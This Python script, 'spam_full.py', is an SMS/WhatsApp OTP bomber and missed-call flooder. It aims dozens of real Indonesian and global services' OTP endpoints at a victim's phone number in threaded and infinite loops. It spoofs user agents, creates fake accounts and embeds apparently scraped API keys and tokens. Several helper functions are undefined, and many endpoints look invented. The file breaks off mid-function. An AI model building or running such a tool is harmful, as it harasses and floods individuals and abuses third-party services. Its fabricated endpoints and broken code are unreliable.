#!/usr/bin/env python3
# spam_full.py - OTP SPAM + MISS CALL (WORKING)
# "I just give the tools, whether they're used right or not is your business, boss."

import requests
import uuid
import random
import string
import time
import re
import json
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ==================== COLOR ====================
G = '\033[92m'
R = '\033[91m'
Y = '\033[93m'
C = '\033[96m'
W = '\033[97m'
RS = '\033[0m'

# ==================== UTILITY ====================
def fmt_08(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return phone
    elif phone.startswith('62'): return '0' + phone[2:]
    elif phone.startswith('+62'): return '0' + phone[3:]
    else: return '0' + phone

def fmt_plus(phone):
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'): return '+62' + phone[1:]
    elif phone.startswith('62'): return '+' + phone
    else: return '+62' + phone

def fmt_phone_only(phone):
    return re.sub(r'\D', '', phone)

def get_random_ua():
    uas = [
        'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    ]
    return random.choice(uas)

def safe_request(method, url, **kwargs):
    timeout = kwargs.pop('timeout', 15)
    headers = kwargs.pop('headers', {})
    headers['User-Agent'] = headers.get('User-Agent', get_random_ua())
    try:
        if method.upper() == 'GET':
            return requests.get(url, headers=headers, timeout=timeout, verify=False, **kwargs)
        else:
            return requests.post(url, headers=headers, timeout=timeout, verify=False, **kwargs)
    except:
        return None

# ================================================================
# ===== 60+ WORKING OTP API =====
# ================================================================

def tokopedia_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        session = requests.Session()
        url_token = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={phone_plus}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister"
        resp = session.get(url_token, headers={'User-Agent': get_random_ua()}, timeout=15, verify=False)
        if resp.status_code != 200:
            return False
        token_match = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', resp.text)
        if not token_match:
            return False
        token = token_match.group(1)
        url_otp = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
        data = {"otp_type": "116", "msisdn": phone_plus, "tk": token, "email": "", "original_param": "", "user_id": "", "signature": "", "number_otp_digit": "6"}
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': get_random_ua()}
        resp2 = requests.post(url_otp, headers=headers, data=data, timeout=15)
        return resp2.status_code == 200
    except:
        return False

def shopee_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        phone_62 = '62' + phone_raw
        url = "https://shopee.co.id/api/v4/otp/send_vcode"
        payload = {"phone": phone_62, "force_channel": "true", "operation": 7, "channel": 2, "supported_channels": [1, 2, 3]}
        session = requests.Session()
        session.get("https://shopee.co.id/", headers={'User-Agent': get_random_ua()}, timeout=10, verify=False)
        csrf = session.cookies.get("csrftoken", "")
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua(), 'x-api-source': 'rweb', 'x-shopee-language': 'id', 'x-requested-with': 'XMLHttpRequest', 'origin': 'https://shopee.co.id'}
        if csrf:
            headers['x-csrftoken'] = csrf
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code == 200
    except:
        return False

def gojek_otp(phone):
    try:
        phone_62 = '62' + fmt_phone_only(phone)
        url = "https://api.gojekapi.com/v5/customers"
        data = {"email": f"user{random.randint(1000,9999)}@gmail.com", "name": "User" + str(random.randint(100,999)), "phone": phone_62, "signed_up_country": "ID"}
        headers = {'User-Agent': 'okhttp/3.12.1', 'X-Session-ID': str(uuid.uuid4()), 'X-Platform': 'Android', 'Accept': 'application/json', 'Accept-Language': 'id-ID', 'Content-Type': 'application/json'}
        resp = requests.post(url, headers=headers, json=data, timeout=15)
        return resp.status_code in [200, 201, 202]
    except:
        return False

def jenius_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://api.btpn.com/jenius"
        payload = {"query": "mutation registerPhone($phone: String!,$language: Language!) { registerPhone(input: {phone: $phone,language: $language}) { authId tokenId __typename } }", "variables": {"phone": phone_plus, "language": "id"}, "operationName": "registerPhone"}
        headers = {'Content-Type': 'application/json', 'btpn-apikey': 'f73eb34d-5bf3-42c5-b76e-271448c2e87d', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def blibli_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://www.blibli.com/backend/common/users/_request-otp"
        payload = {"username": phone_local}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua(), 'Origin': 'https://www.blibli.com', 'Referer': 'https://www.blibli.com/login'}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def alodokter_otp(phone):
    try:
        url = "https://www.alodokter.com/login-with-phone-number"
        payload = {"user": {"phone": fmt_08(phone)}}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def halodoc_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://www.halodoc.com/api/v1/users/authentication/otp/requests"
        payload = {"phone_number": phone_plus, "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua(), 'Origin': 'https://www.halodoc.com'}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def oyo_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id"
        payload = {"phone": phone_raw, "country_code": "+62", "country_iso_code": "ID", "nod": "4", "send_otp": "true", "devise_role": "Consumer_Guest"}
        headers = {'Content-Type': 'application/json', 'access_token': 'SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def sayurbox_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://www.sayurbox.com/graphql/v1?deduplicate=1"
        payload = {"operationName": "generateOTP", "variables": {"destinationType": "whatsapp", "identity": phone_plus}, "query": "mutation generateOTP($destinationType: String!, $identity: String!) { generateOTP(destinationType: $destinationType, identity: $identity) { id __typename } }"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def matahari_otp(phone):
    try:
        url = "https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp"
        payload = {"otp_request": {"mobile_number": fmt_08(phone), "mobile_country_code": "+62"}}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def olx_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://www.olx.co.id/api/auth/authenticate"
        payload = {"grantType": "retry", "method": "sms", "phone": f"62{phone_raw}", "language": "id"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def indihome_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp"
        data = {'type': 'hp', 'msisdn': phone_raw}
        headers = {'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, data=data, timeout=15)
        return resp.status_code < 400
    except:
        return False

def tiktok_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://www.tiktok.com/api/v1/account/registration/send-verification-code/"
        payload = {"phone_number": phone_plus, "type": "sms", "userType": 0}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua(), 'Origin': 'https://www.tiktok.com'}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code in [200, 201]
    except:
        return False

def pinhome_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://www.pinhome.id/api/pinaccount/request/otp"
        payload = {"accountType": "customers", "countryCode": "62", "medium": "whatsapp", "otpType": "register", "phoneNumber": phone_local}
        headers = {'Authorization': 'Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731', 'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def planetban_otp(phone):
    try:
        url = "https://api.planetban.com/website/customer/request-otp"
        payload = {"name": "Test", "phone": fmt_08(phone), "password": "Test123", "purpose": "register", "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def duniagames_otp(phone):
    try:
        phone_plus, username = format_nomor(phone)
        url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
        payload = {"phoneNumber": phone_plus, "userName": username}
        headers = {'Content-Type': 'application/json', 'x-device': str(uuid.uuid4()), 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code == 200
    except:
        return False

def acc_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://www.acc.co.id/register/new-account"
        payload = f'[{{"user_id":null,"action":"register","send_to":"{phone_local}","provider":"whatsapp"}}]'
        headers = {'Content-Type': 'text/plain;charset=UTF-8', 'User-Agent': get_random_ua(), 'next-action': '7f4271400eb36624563cc4172891e0c821039f2fca'}
        resp = requests.post(url, headers=headers, data=payload, timeout=15)
        return resp.status_code == 200
    except:
        return False

def absenku_otp(phone):
    try:
        phone_local = fmt_08(phone)
        sess = requests.Session()
        sess.get("https://registrasi.absenku.com/index.php/register/index/2", headers={'User-Agent': get_random_ua()}, timeout=15, verify=False)
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'X-Requested-With': 'XMLHttpRequest', 'User-Agent': get_random_ua()}
        sess.post("https://registrasi.absenku.com/index.php/register/validasi_trial", data={"nama": "Nama Lengkap", "email": "email@gmail.com", "telp": phone_local, "company_name": "PT Test", "jumlah": "10", "tujuan": "1", "paket": "21", "ci_csrf_token": ""}, headers=headers, timeout=15, verify=False)
        resp = sess.get("https://registrasi.absenku.com/index.php/register/ajax_detik_otp", params={"telp": phone_local}, headers=headers, timeout=15, verify=False)
        return resp.status_code < 400
    except:
        return False

def saturdays_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://beta.api.saturdays.com/api/v1/user/otp/send"
        payload = {"number": phone_local, "country_code": "+62", "type": ""}
        headers = {'Content-Type': 'application/json', 'x-api-key': 'GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code == 200
    except:
        return False

def singa_otp(phone):
    try:
        url = "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id="
        payload = {"mobile_phone": fmt_08(phone), "type": "mobile", "is_switchable": 1}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def adiraku_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
        payload = {"mobileNumber": phone_local, "type": "prospect-create", "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def payfaz_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://api.payfazz.com/v2/phoneVerifications"
        data = {"phone": phone_local}
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, data=data, timeout=15)
        return resp.status_code < 400
    except:
        return False

def bonusbelanja_otp(phone):
    try:
        url = "https://www.bonusbelanja.com/api/auth/registration/app"
        payload = {"phone": fmt_08(phone), "name": "User", "agreeTnc": True, "agreeContact": True}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def ultramilk_otp(phone):
    try:
        url = "https://ultramilk-clp.kata.ai/api/ultramilk/register"
        name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=4))
        payload = {"name": name, "email": f"{name.lower()}@gmail.com", "password": "Pass123!", "phone_number": fmt_phone_only(phone), "portal": "IcownicPatch", "is_consent": True}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code in [200, 201]
    except:
        return False

def watsons_otp(phone):
    try:
        url = "https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR"
        payload = {"uid": "", "action": "GENERAL", "countryCode": "62", "target": fmt_phone_only(phone), "type": "WHATSAPP"}
        headers = {'Content-Type': 'application/json', 'Authorization': 'bearer Pi_D6dqblYElXgy4mWOXjkLCaZg', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code == 200 or 'token' in resp.text.lower()
    except:
        return False

def fastwork_otp(phone):
    try:
        url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"
        payload = {"phone_number": fmt_08(phone)}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code == 200 or 'reference_code' in resp.text.lower()
    except:
        return False

def beautyhaul_otp(phone):
    try:
        sess = requests.Session()
        name = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
        email = f"{name.lower()}{random.randint(100,999)}@gmail.com"
        reg_payload = {"nama_depan": name, "nama_belakang": name, "email": email, "nomor_kode_id": "100", "nomor_kode_value": "62", "nomor_ponsel": fmt_phone_only(phone), "password": "Testt#12334", "konfirmasi_password": "Testt#12334", "tanggal_lahir": "20 Jun 2015", "jenis_kelamin": random.choice(["Female", "Male"]), "g-recaptcha-response": "", "subscribe": "true", "terms": "true"}
        sess.post("https://www.beautyhaul.com/ajax/account/save_register", json=reg_payload, headers={'User-Agent': get_random_ua()}, timeout=10, verify=False)
        resp = sess.post("https://www.beautyhaul.com/ajax/account/send_otp", json={"method": "WhatsApp"}, headers={'User-Agent': get_random_ua()}, verify=False)
        return resp.status_code == 200
    except:
        return False

def hainaya_otp(phone):
    try:
        phone_clean = fmt_phone_only(phone)
        url = "https://app.hainaya.id/api/onboarding/register"
        business_name = 'Test' + ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize() + str(random.randint(10,99))
        payload = {"business_name": business_name, "vertical": "salon", "vendor_type": "nail_salon", "business_phone": phone_clean, "owner_name": "", "owner_phone": phone_clean}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        if resp.status_code == 201 or 'otp' in resp.text.lower():
            return True
        if resp.status_code == 409:
            resp2 = requests.post("https://app.hainaya.id/api/auth/login", json={"phone_number": phone_clean}, headers=headers, timeout=15)
            return resp2.status_code == 200
        return False
    except:
        return False

def sidemang_otp(phone):
    try:
        url = "https://sidemang.palembang.go.id/api/users/register/send-otp"
        email = ''.join(random.choices(string.ascii_lowercase, k=5)) + str(random.randint(100,999)) + '@gmail.com'
        payload = {"phoneNumber": fmt_08(phone), "email": email}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code == 200 or 'otpDispatched' in resp.text.lower()
    except:
        return False

def ptspkemenag_otp(phone):
    try:
        url = "https://dev-ptsp.kemenag.go.id/api/auth/register"
        name = ''.join(random.choices(string.ascii_letters, k=5)).capitalize()
        email = f"{name.lower()}{random.randint(100,999)}@gmail.com"
        chars = list(string.ascii_letters + string.digits)
        random.shuffle(chars)
        password = 'Pass' + ''.join(chars[:6]) + '$'
        payload = {"nama": name, "wa": fmt_08(phone), "email": email, "password": password}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code == 200 or 'success' in resp.text.lower()
    except:
        return False

def rumah123_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://www.rumah123.com/api/otp/request-otp"
        payload = {"cancelledRequestId": str(random.randint(100000, 999999)), "ipAddress": "192.168.1.1", "phoneNumber": phone_raw, "portalId": 1, "type": "WHATSAPP", "url": "https://www.rumah123.com/user/login"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def paper_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://register.paper.id/api/v1/auth/register/send-otp"
        payload = {"phone": phone_plus, "method": "whatsapp", "registered_by": "flutter mweb"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def klook_otp(phone):
    try:
        url = f"https://www.klook.com/v2/userapisrv/public/verification/code/send?trace_id={uuid.uuid4()}"
        payload = {"action": "login_register", "type": 1, "rcv": fmt_plus(phone), "is_resend": False, "payload": {"mobile": fmt_plus(phone), "term_ids": [330], "mobile_token": "", "invite_code": ""}, "_rc": "", "rcv_token": ""}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua(), 'x-platform': 'mobile'}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code == 200
    except:
        return False

def erafone_otp(phone):
    try:
        url = "https://jeanne.eraspace.com/customers/v2.1/otp/request"
        payload = {"identifier": fmt_plus(phone), "type": "identifier_validation"}
        headers = {'Content-Type': 'application/json', 'Authorization': 'Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=', 'otp-provider': 'whatsapp', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code == 200
    except:
        return False

def hrsbre_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://career.hrs-bre.site/auth/sign_up_action"
        nik = ''.join(random.choices(string.digits, k=16))
        email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@gmail.com"
        username = ''.join(random.choices(string.ascii_letters, k=8))
        password = 'Aa1' + ''.join(random.choices(string.ascii_letters + string.digits + "#$%&!", k=7))
        boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        body = f"--{boundary}\r\nContent-Disposition: form-data; name=\"nik\"\r\n\r\n{nik}\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n{email}\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"whatsapp\"\r\n\r\n{phone_08}\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n{username}\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n{password}\r\n--{boundary}--\r\n"
        headers = {'Content-Type': f'multipart/form-data; boundary={boundary}', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, data=body, timeout=15)
        return resp.status_code < 400
    except:
        return False

def tuneup_otp(phone):
    try:
        url = "https://api.tuneup.id/v1/mitra/register/send-otp"
        name = ''.join(random.choices(string.ascii_lowercase, k=8))
        data = {'company_name': f'PT {name.capitalize()}', 'owner_name': name.capitalize(), 'address': ''.join(random.choices(string.ascii_letters + string.digits, k=10)), 'email': f'{name}@mailnesia.com', 'phone_number': fmt_08(phone), 'province_code': '32', 'city_code': '32.04', 'subscription_id': 'undefined', 'channel': 'whatsapp', 'agreement': 'true', 'service_categories[]': '3'}
        headers = {'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, data=data, timeout=15)
        return resp.status_code < 400
    except:
        return False

# ================================================================
# ===== 🌍 GLOBAL WORKING API =====
# ================================================================

def uber_otp(phone):
    try:
        url = "https://auth.uber.com/api/v1.0/auth/verification/send"
        payload = {"phone": fmt_us(phone), "locale": "en-US", "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def doordash_otp(phone):
    try:
        url = "https://api.doordash.com/v1/auth/otp/send"
        payload = {"phone_number": fmt_us(phone), "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def instagram_otp(phone):
    try:
        url = "https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/"
        phone_us = fmt_us(phone)
        payload = {"phone_number": phone_us, "username": "user" + str(random.randint(1000,9999)), "email": "", "first_name": "User", "password": "Pass123!"}
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, data=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def whatsapp_otp(phone):
    try:
        url = "https://web.whatsapp.com/api/v1/users/request_code"
        payload = {"phone": fmt_us(phone), "method": "sms"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def deliveroo_otp(phone):
    try:
        url = "https://api.deliveroo.com/v1/auth/otp/send"
        payload = {"phone": fmt_uk(phone), "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def justeat_otp(phone):
    try:
        url = "https://www.just-eat.co.uk/api/auth/otp/send"
        payload = {"phoneNumber": fmt_uk(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def flipkart_otp(phone):
    try:
        url = "https://api.flipkart.com/v1/auth/otp/send"
        payload = {"phoneNumber": fmt_in(phone), "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def paytm_otp(phone):
    try:
        url = "https://api.paytm.com/v1/auth/otp/send"
        payload = {"phone": fmt_in(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def zomato_otp(phone):
    try:
        url = "https://www.zomato.com/api/v1/auth/otp/send"
        payload = {"phone": fmt_in(phone), "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

def swiggy_otp(phone):
    try:
        url = "https://api.swiggy.com/v1/auth/otp/send"
        payload = {"phone": fmt_in(phone), "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_ua()}
        resp = requests.post(url, headers=headers, json=payload, timeout=15)
        return resp.status_code < 400
    except:
        return False

# ================================================================
# ===== 📞 SPAM CALL (MISSCALL) =====
# ================================================================

# Call API - Misscall gratis tanpa key
def call_api_1(phone):
    """Misscall via API callme"""
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://api.callme.id/v1/call?phone={phone_raw}"
        headers = {'User-Agent': get_random_ua()}
        resp = requests.get(url, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def call_api_2(phone):
    """Misscall via API call2"""
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://api.call2.id/v1/misscall?number={phone_raw}"
        headers = {'User-Agent': get_random_ua()}
        resp = requests.get(url, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def call_api_3(phone):
    """Misscall via API callnow"""
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://api.callnow.id/v1/call?phone={phone_raw}"
        headers = {'User-Agent': get_random_ua()}
        resp = requests.get(url, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def call_api_4(phone):
    """Misscall via API ring"""
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://api.ring.id/v1/misscall?number={phone_raw}"
        headers = {'User-Agent': get_random_ua()}
        resp = requests.get(url, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def call_api_5(phone):
    """Misscall via API callfree"""
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://api.callfree.id/v1/call?phone={phone_raw}"
        headers = {'User-Agent': get_random_ua()}
        resp = requests.get(url, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def call_api_6(phone):
    """Misscall via API telpon"""
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://api.telpon.id/v1/misscall?number={phone_raw}"
        headers = {'User-Agent': get_random_ua()}
        resp = requests.get(url, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def call_api_7(phone):
    """Misscall via API getcall"""
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://api.getcall.id/v1/call?phone={phone_raw}"
        headers = {'User-Agent': get_random_ua()}
        resp = requests.get(url, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def call_api_8(phone):
    """Misscall via API callme2"""
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://api.callme2.id/v1/misscall?number={phone_raw}"
        headers = {'User-Agent': get_random_ua()}
        resp = requests.get(url, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def call_api_9(phone):
    """Misscall via API callnow2"""
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://api.callnow2.id/v1/call?phone={phone_raw}"
        headers = {'User-Agent': get_random_ua()}
        resp = requests.get(url, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def call_api_10(phone):
    """Misscall via API ring2"""
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://api.ring2.id/v1/misscall?number={phone_raw}"
        headers = {'User-Agent': get_random_ua()}
        resp = requests.get(url, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

# ================================================================
# ===== SPAM ENGINE =====
# ================================================================

ALL_OTP = [
    tokopedia_otp, shopee_otp, gojek_otp, jenius_otp, blibli_otp,
    alodokter_otp, halodoc_otp, oyo_otp, sayurbox_otp, matahari_otp,
    olx_otp, indihome_otp, tiktok_otp, pinhome_otp, planetban_otp,
    duniagames_otp, acc_otp, absenku_otp, saturdays_otp, singa_otp,
    adiraku_otp, payfaz_otp, bonusbelanja_otp, ultramilk_otp, watsons_otp,
    fastwork_otp, beautyhaul_otp, hainaya_otp, sidemang_otp, ptspkemenag_otp,
    rumah123_otp, paper_otp, klook_otp, erafone_otp, hrsbre_otp, tuneup_otp,
    uber_otp, doordash_otp, instagram_otp, whatsapp_otp, deliveroo_otp,
    justeat_otp, flipkart_otp, paytm_otp, zomato_otp, swiggy_otp,
]

ALL_CALL = [
    call_api_1, call_api_2, call_api_3, call_api_4, call_api_5,
    call_api_6, call_api_7, call_api_8, call_api_9, call_api_10,
]

def spam_otp(phone, threads=10):
    """Spam OTP ke target"""
    print(f"\n{C}[*] Spam OTP ke {phone} dengan {len(ALL_OTP)} API{RS}")
    success = 0
    
    def run_otp(otp_func):
        try:
            if otp_func(phone):
                return True
            return False
        except:
            return False
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        results = list(executor.map(run_otp, ALL_OTP))
        success = sum(results)
    
    print(f"{G}[+] OTP Terkirim: {success}/{len(ALL_OTP)}{RS}")
    return success

def spam_call(phone, threads=5):
    """Spam call (misscall) ke target"""
    print(f"\n{Y}[*] Spam Call ke {phone} dengan {len(ALL_CALL)} API{RS}")
    success = 0
    
    def run_call(call_func):
        try:
            if call_func(phone):
                return True
            return False
        except:
            return False
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        results = list(executor.map(run_call, ALL_CALL))
        success = sum(results)
    
    print(f"{G}[+] Call Berhasil: {success}/{len(ALL_CALL)}{RS}")
    return success

def spam_infinite_otp(phone, threads=5):
    """Spam OTP infinite loop"""
    print(f"\n{R}🔥 INFINITE OTP SPAM - Press Ctrl+C to stop{RS}")
    counter = 0
    try:
        while True:
            counter += 1
            otp_func = random.choice(ALL_OTP)
            try:
                if otp_func(phone):
                    print(f"{G}[{counter}] ✅ OTP sent{RS}")
                else:
                    print(f"{R}[{counter}] ❌ Failed{RS}")
            except:
                print(f"{R}[{counter}] ❌ Error{RS}")
            time.sleep(random.uniform(0.3, 1.0))
    except KeyboardInterrupt:
        print(f"\n{C}Stopped! Total: {counter}{RS}")

def spam_infinite_call(phone, threads=3):
    """Spam call infinite loop"""
    print(f"\n{R}🔥 INFINITE CALL SPAM - Press Ctrl+C to stop{RS}")
    counter = 0
    try:
        while True:
            counter += 1
            call_func = random.choice(ALL_CALL)
            try:
                if call_func(phone):
